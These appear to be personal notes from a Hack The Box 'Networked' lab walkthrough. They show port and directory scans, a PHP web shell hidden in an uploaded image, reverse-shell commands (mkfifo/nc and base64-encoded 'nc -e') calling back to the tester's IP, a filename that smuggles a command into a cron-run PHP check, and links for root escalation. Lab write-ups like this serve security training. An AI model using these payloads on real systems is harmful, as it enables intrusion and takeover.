nmap
```
┌──(kali㉿kali)-[~/HTB/networked]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.204.101
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 06:57 EST
Nmap scan report for 10.129.204.101
Host is up (0.047s latency).
Not shown: 65382 filtered tcp ports (no-response), 150 filtered tcp ports (host-prohibited)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
443/tcp closed https
Device type: general purpose|WAP|media device|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), Asus embedded (88%), Amazon embedded (88%), QNAP QTS 5.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:qnap:qts:5.0 cpe:/o:linux:linux_kernel:5.10
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.14 (94%), Linux 3.13 - 4.4 (94%), Linux 3.10 (92%), Linux 2.6.32 - 3.13 (91%), Linux 5.0 (91%), Linux 5.0 - 5.14 (91%), Linux 3.8 - 3.16 (90%), Linux 5.1 - 5.15 (90%), OpenWrt 19.07 (Linux 4.14) (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   42.93 ms 10.10.14.1
2   49.32 ms 10.129.204.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.87 seconds
```

```
┌──(kali㉿kali)-[~/HTB/networked]
└─$ dirsearch -u http://10.129.204.101/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/networked/reports/http_10.129.204.101/__25-01-16_06-57-11.txt

Target: http://10.129.204.101/

[06:57:11] Starting: 
[06:57:18] 403 -  213B  - /.ht_wsr.txt                                      
[06:57:19] 403 -  218B  - /.htaccess.sample
[06:57:18] 403 -  216B  - /.htaccess.orig                                   
[06:57:18] 403 -  216B  - /.htaccess.bak1
[06:57:19] 403 -  214B  - /.htaccessBAK                                     
[06:57:19] 403 -  216B  - /.htaccess_orig                                   
[06:57:19] 403 -  216B  - /.htaccess.save                                   
[06:57:19] 403 -  214B  - /.htaccess_sc
[06:57:19] 403 -  217B  - /.htaccess_extra                                  
[06:57:19] 403 -  214B  - /.htaccessOLD                                     
[06:57:19] 403 -  215B  - /.htaccessOLD2                                    
[06:57:19] 403 -  207B  - /.html
[06:57:19] 403 -  216B  - /.htpasswd_test                                   
[06:57:19] 403 -  212B  - /.htpasswds
[06:57:19] 403 -  206B  - /.htm                                             
[06:57:19] 403 -  213B  - /.httr-oauth                                      
[06:58:08] 301 -  237B  - /backup  ->  http://10.129.204.101/backup/        
[06:58:08] 200 -  885B  - /backup/                                          
[06:58:15] 403 -  210B  - /cgi-bin/                                         
[06:59:20] 200 -    1KB - /photos.php                                       
[06:59:59] 200 -  169B  - /upload.php                                       
[07:00:00] 301 -  238B  - /uploads  ->  http://10.129.204.101/uploads/      
[07:00:00] 200 -    2B  - /uploads/                                         
                                                                             
Task Completed
```

![Pasted image 20250116195932](<0. Attachments/Pasted image 20250116195932.png>)

![Pasted image 20250116202558](<0. Attachments/Pasted image 20250116202558.png>)

![Pasted image 20250116202617](<0. Attachments/Pasted image 20250116202617.png>)

now creating our image and using a oneliner
```
<?php echo "START<br/><br/>\n\n\n"; system($_GET["cmd"]); echo "\n\n\n<br/><br/>END"; ?>
```

![Pasted image 20250116203136](<0. Attachments/Pasted image 20250116203136.png>)

```
http://10.129.204.101/uploads/10_10_14_4.php.png?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.4%20443%20%3E%2Ftmp%2Ff
```

![Pasted image 20250116203736](<0. Attachments/Pasted image 20250116203736.png>)

trying to get a shell back
![Pasted image 20250116204408](<0. Attachments/Pasted image 20250116204408.png>)
```
echo nc -e /bin/bash 10.10.14.4 4444 | base64 -w0

echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjQgNDQ0NAo= | base64 -d | sh
```

now to priv esc to another user
```
touch '/var/www/html/uploads/a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjQgNDQ0NAo= | base64 -d | sh; b'
```
![Pasted image 20250116204745](<0. Attachments/Pasted image 20250116204745.png>)

we did this because `crontab.guly` shows a config that would run `php /home/guly/check_attack.php`
that php does checks like
`exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");

we store our attack in $value

after the cron does its work we get in
![Pasted image 20250116205324](<0. Attachments/Pasted image 20250116205324.png>)

upgrade shell
```
python -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo ; fg ; reset;
```

![Pasted image 20250116205446](<0. Attachments/Pasted image 20250116205446.png>)

priv esc to root
[Full Disclosure: Redhat/CentOS root through network-scripts](https://seclists.org/fulldisclosure/2019/Apr/24)

[Full Disclosure: Re: Redhat/CentOS root through network-scripts](https://seclists.org/fulldisclosure/2019/Apr/27)

![Pasted image 20250116205953](<0. Attachments/Pasted image 20250116205953.png>)

![Pasted image 20250116210021](<0. Attachments/Pasted image 20250116210021.png>)

